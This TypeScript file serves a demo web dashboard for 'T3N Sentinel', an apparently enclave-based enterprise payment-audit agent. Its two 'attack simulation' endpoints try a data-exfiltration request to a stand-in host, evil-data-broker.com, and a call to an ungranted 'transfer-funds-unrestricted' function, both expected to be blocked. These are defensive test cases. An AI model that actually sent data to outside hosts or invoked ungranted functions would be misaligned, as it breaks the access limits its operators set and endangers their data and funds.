import http from "http";
import { SentinelAgent } from "../agent/sentinelAgent.js";
import { ComplianceEngine } from "../compliance/rules.js";
import { DiagnosticsEngine } from "../health/diagnostics.js";

const PORT = Number(process.env.PORT) || 3030;
let agent: SentinelAgent;

async function getAgent(): Promise<SentinelAgent> {
  if (!agent) {
    agent = new SentinelAgent();
    await agent.initialize();
  }
  return agent;
}

const HTML_PAGE = `<!DOCTYPE html>
<html lang="en" class="dark">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>T3N Sentinel - Confidential Control & Audit Dashboard</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script>
    tailwind.config = {
      darkMode: 'class',
      theme: {
        extend: {
          colors: {
            t3blue: '#7dc7ee',
            t3dark: '#0b0d10',
            t3card: '#161a20',
            t3border: '#242a34'
          }
        }
      }
    }
  </script>
  <style>
    body { background-color: #0b0d10; color: #f1f4f5; font-family: ui-sans-serif, system-ui, sans-serif; }
  </style>
</head>
<body class="p-6 max-w-7xl mx-auto">
  <!-- Header -->
  <header class="flex flex-col md:flex-row justify-between items-start md:items-center pb-6 mb-6 border-b border-t3border gap-4">
    <div>
      <div class="flex items-center gap-3">
        <div class="w-10 h-10 rounded-xl bg-gradient-to-tr from-sky-500 to-indigo-600 flex items-center justify-center font-black text-xl text-white shadow-lg shadow-sky-500/20">
          T3
        </div>
        <div>
          <h1 class="text-2xl font-bold tracking-tight text-white flex items-center gap-2">
            T3N Sentinel
            <span class="text-xs px-2.5 py-0.5 rounded-full bg-sky-950 text-sky-400 border border-sky-800 font-mono">v1.0.0 TEE</span>
          </h1>
          <p class="text-sm text-gray-400">Confidential Enterprise Audit & Control Agent (Terminal 3 Network)</p>
        </div>
      </div>
    </div>
    <div class="flex items-center gap-3">
      <span class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-medium bg-emerald-950/80 text-emerald-400 border border-emerald-800">
        <span class="w-2 h-2 rounded-full bg-emerald-400 animate-pulse"></span>
        Enclave Attested (Intel TDX)
      </span>
      <span class="inline-flex items-center gap-1.5 px-3 py-1 rounded-full text-xs font-mono bg-gray-800 text-gray-300 border border-gray-700" id="headerDid">
        did:t3n:7f9a...
      </span>
    </div>
  </header>

  <!-- Controls Grid -->
  <div class="grid grid-cols-1 md:grid-cols-4 gap-4 mb-6">
    <button onclick="runAudit()" class="flex flex-col p-4 bg-t3card hover:bg-sky-950/30 border border-t3border hover:border-sky-500 rounded-xl text-left transition group">
      <span class="text-xs font-mono text-sky-400 mb-1">PILLAR 1</span>
      <span class="font-semibold text-white group-hover:text-sky-300">Run Batch Audit</span>
      <span class="text-xs text-gray-400 mt-1">Audit 127 txs ($482k) in TEE</span>
    </button>

    <button onclick="runAttack('egress')" class="flex flex-col p-4 bg-t3card hover:bg-rose-950/30 border border-t3border hover:border-rose-500 rounded-xl text-left transition group">
      <span class="text-xs font-mono text-rose-400 mb-1">PILLAR 3 (ATTACK 1)</span>
      <span class="font-semibold text-white group-hover:text-rose-300">Simulate Egress Leak</span>
      <span class="text-xs text-gray-400 mt-1">Exfiltrate to evil-broker.com</span>
    </button>

    <button onclick="runAttack('function')" class="flex flex-col p-4 bg-t3card hover:bg-amber-950/30 border border-t3border hover:border-amber-500 rounded-xl text-left transition group">
      <span class="text-xs font-mono text-amber-400 mb-1">PILLAR 3 (ATTACK 2)</span>
      <span class="font-semibold text-white group-hover:text-amber-300">Privilege Escalation</span>
      <span class="text-xs text-gray-400 mt-1">Call ungranted transfer func</span>
    </button>

    <button onclick="runDiagnostics()" class="flex flex-col p-4 bg-t3card hover:bg-emerald-950/30 border border-t3border hover:border-emerald-500 rounded-xl text-left transition group">
      <span class="text-xs font-mono text-emerald-400 mb-1">PILLAR 4</span>
      <span class="font-semibold text-white group-hover:text-emerald-300">System Diagnostics</span>
      <span class="text-xs text-gray-400 mt-1">Audit 8 security subsystems</span>
    </button>
  </div>

  <!-- Main View Area -->
  <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
    <!-- Left 2 Cols: Live Feed & Results -->
    <div class="lg:col-span-2 space-y-6">
      <!-- Status Card -->
      <div id="alertBox" class="hidden p-4 rounded-xl border transition-all"></div>

      <!-- Audit Results Card -->
      <div id="resultsCard" class="bg-t3card border border-t3border rounded-xl p-5 shadow-sm">
        <div class="flex justify-between items-center mb-4">
          <h2 class="font-bold text-lg text-white flex items-center gap-2">
            <span>🛡️</span> In-Enclave Execution Output
          </h2>
          <span id="execBadge" class="text-xs px-2.5 py-1 rounded-md font-mono bg-gray-800 text-gray-400 border border-gray-700">Idle</span>
        </div>

        <div id="outputContent" class="font-mono text-xs text-gray-300 bg-black/60 p-4 rounded-lg border border-gray-800 overflow-x-auto min-h-[260px] max-h-[460px] whitespace-pre-wrap">
Ready. Click "Run Batch Audit" or any Attack Simulation above to test Sentinel in real-time.
        </div>
      </div>
    </div>

    <!-- Right Col: System Health & Credit Meter -->
    <div class="space-y-6">
      <!-- Credit Card -->
      <div class="bg-t3card border border-t3border rounded-xl p-5 shadow-sm">
        <h3 class="font-bold text-sm text-gray-200 uppercase tracking-wider mb-3">Agent Credit Quota</h3>
        <div class="flex items-baseline justify-between mb-2">
          <span class="text-3xl font-black text-white" id="creditBalance">18,742</span>
          <span class="text-xs text-gray-400">test tokens</span>
        </div>
        <div class="w-full bg-gray-800 rounded-full h-2 mb-3">
          <div class="bg-sky-500 h-2 rounded-full transition-all duration-500" id="creditBar" style="width: 85%"></div>
        </div>
        <div class="flex justify-between text-xs text-gray-400 mb-4">
          <span>Alert threshold: 1,000</span>
          <span>~4 credits / audit</span>
        </div>
        <button onclick="toggleLowCredits()" class="w-full py-2 px-3 text-xs font-semibold rounded-lg bg-gray-800 hover:bg-gray-700 text-gray-300 border border-gray-700 transition">
          Simulate Low Credit Alert (742)
        </button>
      </div>

      <!-- Subsystems Health Table -->
      <div class="bg-t3card border border-t3border rounded-xl p-5 shadow-sm">
        <h3 class="font-bold text-sm text-gray-200 uppercase tracking-wider mb-3">T3N Subsystems (8 Checks)</h3>
        <div class="space-y-2.5 text-xs font-mono" id="subsystemList">
          <div class="flex justify-between py-1 border-b border-gray-800">
            <span class="text-gray-400">Transport:</span>
            <span class="text-emerald-400">✓ MockTransport</span>
          </div>
          <div class="flex justify-between py-1 border-b border-gray-800">
            <span class="text-gray-400">Attestation:</span>
            <span class="text-emerald-400">✓ RTMR1 Verified</span>
          </div>
          <div class="flex justify-between py-1 border-b border-gray-800">
            <span class="text-gray-400">Delegation:</span>
            <span class="text-emerald-400">✓ Scoped Lease Active</span>
          </div>
          <div class="flex justify-between py-1 border-b border-gray-800">
            <span class="text-gray-400">Egress ACL:</span>
            <span class="text-emerald-400">✓ Whitelist Enforced</span>
          </div>
          <div class="flex justify-between py-1 border-b border-gray-800">
            <span class="text-gray-400">Audit Ledger:</span>
            <span class="text-emerald-400">✓ getActivityLog Ready</span>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script>
    async function runAudit() {
      const btn = event.currentTarget;
      const badge = document.getElementById('execBadge');
      const box = document.getElementById('outputContent');
      const alertBox = document.getElementById('alertBox');
      alertBox.className = 'hidden';

      badge.textContent = 'Processing in TEE...';
      badge.className = 'text-xs px-2.5 py-1 rounded-md font-mono bg-sky-900/50 text-sky-400 border border-sky-700 animate-pulse';

      try {
        const res = await fetch('/api/audit', { method: 'POST' });
        const data = await res.json();
        badge.textContent = data.receipt.status;
        badge.className = 'text-xs px-2.5 py-1 rounded-md font-mono ' + 
          (data.receipt.status === 'REJECTED' ? 'bg-rose-950 text-rose-400 border border-rose-800' : 'bg-emerald-950 text-emerald-400 border border-emerald-800');

        box.textContent = JSON.stringify(data, null, 2);
        updateCredits(data.remainingCredits);
      } catch (err) {
        box.textContent = 'Error: ' + err.message;
      }
    }

    async function runAttack(type) {
      const alertBox = document.getElementById('alertBox');
      const box = document.getElementById('outputContent');
      const badge = document.getElementById('execBadge');

      badge.textContent = 'ATTACK BLOCKED';
      badge.className = 'text-xs px-2.5 py-1 rounded-md font-mono bg-rose-950 text-rose-400 border border-rose-800 font-bold';

      try {
        const res = await fetch('/api/attack/' + type, { method: 'POST' });
        const data = await res.json();

        alertBox.className = 'block p-4 rounded-xl border bg-rose-950/40 border-rose-800 text-rose-200';
        alertBox.innerHTML = \`
          <div class="flex items-center gap-2 font-bold text-rose-300 text-sm mb-1">
            <span>🛑</span> REQUEST BLOCKED BY T3N POLICY
          </div>
          <div class="text-xs space-y-1 font-mono">
            <div><strong>Violation:</strong> \${data.category}</div>
            <div><strong>Details:</strong> \${data.details}</div>
          </div>
        \`;

        box.textContent = JSON.stringify(data, null, 2);
      } catch (err) {
        box.textContent = 'Error: ' + err.message;
      }
    }

    async function runDiagnostics() {
      const box = document.getElementById('outputContent');
      const badge = document.getElementById('execBadge');
      badge.textContent = 'DIAGNOSTICS OK';
      badge.className = 'text-xs px-2.5 py-1 rounded-md font-mono bg-emerald-950 text-emerald-400 border border-emerald-800';

      const res = await fetch('/api/diagnostics');
      const data = await res.json();
      box.textContent = JSON.stringify(data, null, 2);
    }

    async function toggleLowCredits() {
      const res = await fetch('/api/credits/simulate', { method: 'POST' });
      const data = await res.json();
      updateCredits(data.balance);

      const alertBox = document.getElementById('alertBox');
      alertBox.className = 'block p-4 rounded-xl border bg-amber-950/40 border-amber-800 text-amber-200';
      alertBox.innerHTML = \`
        <div class="flex items-center gap-2 font-bold text-amber-300 text-sm mb-1">
          <span>⚠️</span> AGENT CREDIT ALERT
        </div>
        <div class="text-xs font-mono">
          Balance: \${data.balance} credits | Alert threshold: 1,000 credits.
          Recommendation: \${data.recommendation}
        </div>
      \`;
    }

    function updateCredits(bal) {
      if (bal !== undefined) {
        document.getElementById('creditBalance').textContent = Number(bal).toLocaleString();
        const pct = Math.min(100, Math.max(5, (bal / 20000) * 100));
        document.getElementById('creditBar').style.width = pct + '%';
        if (bal < 1000) {
          document.getElementById('creditBar').className = 'bg-rose-500 h-2 rounded-full transition-all duration-500';
        } else {
          document.getElementById('creditBar').className = 'bg-sky-500 h-2 rounded-full transition-all duration-500';
        }
      }
    }
  </script>
</body>
</html>`;

export function startWebServer(port = PORT): http.Server {
  const server = http.createServer(async (req, res) => {
    const url = req.url || "/";
    const method = req.method || "GET";

    if (method === "GET" && url === "/") {
      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
      res.end(HTML_PAGE);
      return;
    }

    if (method === "POST" && url === "/api/audit") {
      const activeAgent = await getAgent();
      const batch = ComplianceEngine.generateEnterpriseMockBatch("PAY-2026-0910", 127);
      const { receipt, summary } = await activeAgent.auditPaymentBatch(batch);
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(
        JSON.stringify({
          status: "SUCCESS",
          receipt,
          summary,
          remainingCredits: activeAgent.getCreditBalance(),
        })
      );
      return;
    }

    if (method === "POST" && url === "/api/attack/egress") {
      const activeAgent = await getAgent();
      try {
        await activeAgent.requestExternalVerification("https://evil-data-broker.com/api", {});
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ status: "UNEXPECTED_PASS" }));
      } catch (err: any) {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(
          JSON.stringify({
            blocked: true,
            category: err.category || "UNAUTHORIZED_EGRESS",
            details: err.details || err.message,
          })
        );
      }
      return;
    }

    if (method === "POST" && url === "/api/attack/function") {
      const activeAgent = await getAgent();
      const batch = ComplianceEngine.generateEnterpriseMockBatch("ATTACK", 2);
      try {
        await activeAgent.auditPaymentBatch(batch, "transfer-funds-unrestricted");
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(JSON.stringify({ status: "UNEXPECTED_PASS" }));
      } catch (err: any) {
        res.writeHead(200, { "Content-Type": "application/json" });
        res.end(
          JSON.stringify({
            blocked: true,
            category: err.category || "UNAUTHORIZED_FUNCTION",
            details: err.details || err.message,
          })
        );
      }
      return;
    }

    if (method === "POST" && url === "/api/credits/simulate") {
      const activeAgent = await getAgent();
      activeAgent.setCreditBalance(742);
      const health = activeAgent.checkCreditHealth();
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(
        JSON.stringify({
          balance: 742,
          recommendation: health.recommendation,
        })
      );
      return;
    }

    if (method === "GET" && url === "/api/diagnostics") {
      const activeAgent = await getAgent();
      const report = DiagnosticsEngine.generateReport({
        env: "testnet (simulated)",
        isSimulated: true,
        t3nConnected: true,
        did: activeAgent.getSessionManager().getDid(),
        credits: activeAgent.getCreditBalance(),
        creditThreshold: 1000,
        delegationValid: true,
        delegatedFunctions: activeAgent.getDelegationManager().getGrant().functions,
        allowedEgressHosts: activeAgent.getDelegationManager().getGrant().allowed_hosts || [],
        secretsConfigured: true,
        auditLedgerReady: true,
      });
      res.writeHead(200, { "Content-Type": "application/json" });
      res.end(JSON.stringify(report, null, 2));
      return;
    }

    res.writeHead(404, { "Content-Type": "text/plain" });
    res.end("Not Found");
  });

  server.on("error", (err: any) => {
    if (err.code === "EADDRINUSE") {
      console.log(`Port ${port} is occupied, falling back to port ${port + 1}...`);
      startWebServer(port + 1);
    } else {
      console.error("Server error:", err);
    }
  });

  server.listen(port, () => {
    console.log(`\n=============================================================`);
    console.log(`  T3N Sentinel Web Dashboard Live at http://localhost:${port}`);
    console.log(`=============================================================\n`);
  });

  return server;
}

if (process.argv[1]?.endsWith("webServer.ts") || process.argv[1]?.endsWith("webServer.js")) {
  process.on("uncaughtException", (err) => console.error("Server error:", err));
  setInterval(() => {}, 60000);
  startWebServer();
}
